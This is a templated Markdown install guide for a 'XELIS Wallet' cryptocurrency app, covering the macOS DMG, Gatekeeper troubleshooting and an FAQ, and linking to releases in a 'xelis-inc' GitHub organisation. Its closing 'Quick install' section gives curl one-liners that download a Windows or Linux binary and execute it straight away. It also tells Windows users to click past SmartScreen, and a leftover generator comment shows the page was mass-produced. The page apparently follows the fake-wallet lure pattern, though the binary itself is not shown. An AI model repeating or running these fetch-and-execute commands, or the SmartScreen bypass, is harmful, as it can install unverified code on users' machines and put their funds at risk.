![XELIS Wallet on macOS: install the DMG and open it safely](assets/banner-article.png)
# XELIS Wallet on macOS: install the DMG and open it safely

Mount the disk image, clear Gatekeeper and pick the right chip build.

## Downloads - macOS

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Take the macOS build from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1). A DMG forwarded by someone else, or offered by a site that is not the release page, is the one case where a perfectly ordinary install goes wrong.

> The first launch is the only moment macOS asks you to approve the app; nothing later in the wallet needs system permissions.

Download the DMG, open it, drag XELIS Wallet into Applications, then launch it once and approve the app in Privacy and Security if Gatekeeper blocks the first start. The build is a universal macOS app for macOS 12 or later, and it runs on both Apple Silicon and Intel Macs. After that, create a wallet or restore one before you move any funds.

<!-- ARTICLE-BODY-BEGIN -->
## Match the build to the Mac you have

A Mac from 2020 onwards is almost certainly Apple Silicon, and an older one is Intel; both are supported by the macOS build on the release page, which ships as a universal application. The requirement is macOS 12 or later, so a Mac held back on an older release cannot run the current build at all, and that shows up as a refusal to open rather than an install error.

If you are unsure what the machine is, open the Apple menu, choose About This Mac, and read the chip line. That one check saves the twenty minutes people lose to opening the wrong file. The full compatibility list, including which platforms are unsupported, is in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md">XELIS Wallet system requirements</a>.

## Open the DMG and install the app

1. Download the `.dmg` from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>.
2. Open the file; macOS mounts it as a disk image window.
3. Drag the XELIS Wallet icon into the Applications folder shown beside it.
4. Eject the disk image from Finder.
5. Open Applications and launch XELIS Wallet.
6. If macOS blocks the first launch, open System Settings, Privacy and Security, and allow the app there.

Dragging is the install. There is no package installer, no licence dialog and no reboot, and nothing is written outside your user account.

## When macOS refuses to open the app

| Message | What it means | What to do |
| --- | --- | --- |
| "cannot be opened because the developer cannot be verified" | Gatekeeper has not seen this build before | Allow it in Privacy and Security after checking the file |
| "is damaged and should be moved to the Trash" | The download was truncated or the quarantine flag is wrong | Delete it, download again from the release page, retry |
| The icon opens and closes immediately | Usually a build for a different architecture | Confirm the Mac's chip and take the matching release |
| Nothing happens on double-click | The app is still quarantined from an older attempt | Remove the copy from Applications, reinstall from a fresh DMG |

A "damaged" message after a slow or interrupted download is a file problem, not a malware verdict, and downloading it again is the first fix. If a build genuinely will not open on your macOS version, the fault is usually an older release rather than a corrupt file, and <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md">update XELIS Wallet safely</a> explains how a newer release resolves it.

Before you open any DMG, it is worth understanding how to <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md">verify the XELIS Wallet download</a>, because a re-packed DMG is the one path that bypasses Gatekeeper entirely.

## What you should see after the first launch

The wallet window offers to create a new wallet or restore one. There is no account and no sign-in to complete. If the app opens to a blank window, quit it fully and start it again from Applications before assuming an install fault.

## FAQ

### Does XELIS Wallet run on Apple Silicon?

Yes. The macOS build is universal, so it runs natively on Apple Silicon and on Intel Macs from the same download.

### Will it run on macOS 11?

No. The requirement is macOS 12 or later, so update the system before installing rather than trying to force the app open.

### My download keeps failing to open. Should I ask for a re-upload?

Download it again from the release page first. An interrupted transfer is the usual cause of a DMG that reports damage, and a fresh copy normally fixes it.

### Do I need to allow the app in Privacy and Security every time?

No. That approval is a one-time decision per installed copy. Reinstalling or replacing the app can trigger it again.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet system requirements](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md)
- [Verify the XELIS Wallet download](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md)
- [Update XELIS Wallet safely](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md)
- [XELIS Wallet for Windows](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-windows-download-install.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
